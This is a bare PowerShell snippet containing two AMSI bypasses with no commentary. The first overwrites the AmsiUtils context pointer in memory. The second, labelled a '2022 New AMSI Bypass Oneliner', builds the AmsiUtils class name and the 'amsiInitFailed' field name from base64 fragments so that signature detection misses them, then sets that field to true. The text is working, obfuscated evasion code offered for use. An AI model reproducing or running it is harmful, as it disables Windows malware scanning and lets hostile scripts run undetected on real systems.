$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)



2022 New AMSI Bypass Oneliner:
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)
